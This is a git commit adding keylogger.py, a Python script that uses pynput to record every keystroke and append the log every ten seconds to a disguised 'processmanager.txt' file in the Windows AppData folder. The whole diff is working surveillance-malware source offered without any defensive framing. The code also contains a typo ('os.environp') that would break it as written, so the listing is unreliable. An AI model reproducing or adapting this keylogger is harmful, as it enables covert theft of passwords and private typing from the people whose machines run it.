20377bd279eda8ccd4493afc89d47151c1ba9a1d
anujbolewar <bolewara@gmail.com>
2025-09-22 15:53:55 +0530

    Add the condition statements , difine the start ufnction and file ,log management

---
+++ keylogger.py
@@ -0,0 +1,51 @@
+#!/usr/bin/python3
+import pynput.keyboard
+import threading
+import os 
+
+log = ""
+path = os.environp["appdata"] + "\\processmanager.txt"  #path where the log file will be stored in your system
+
+def process_keys(key):
+  # print(key)   ---> you can use it to see the keys in terminal for testing purpose
+  global log
+  try:
+# by this it will print the previous chracter also in the log
+    log = log + str(key.char)
+  except AttributeError:
+    if key == key.space:
+      log = log + " "
+    elif key == key.right or key == key.left:
+      log = log + ""
+    elif key == key.up or key == key.down:
+      log = log + ""
+    else:
+        log = log + " " + str(key) + " "    # this is for the keys like enter,shift etc jo character me convert nhi ho skte
+  # print(log)  --> for the testing purpose
+
+
+def report():
+  global log
+  global path
+  fin = open(path,"a")
+  fin.write(log)
+  log = ""
+  fin.close()
+  timer = threading.Timer(10,report)    
+  timer.start()
+
+
+
+
+#this will help you see the keylooger is working properly or not on your side ..
+  # with open("log.txt","a") as fin:
+  # 	fin.write(str(key))
+
+
+
+def start():
+  keyboard_listener = pynput.keyboard.Listener(on_press=process_keys)
+  with keyboard_listener:
+    report()
+    keyboard_listener.join()
+
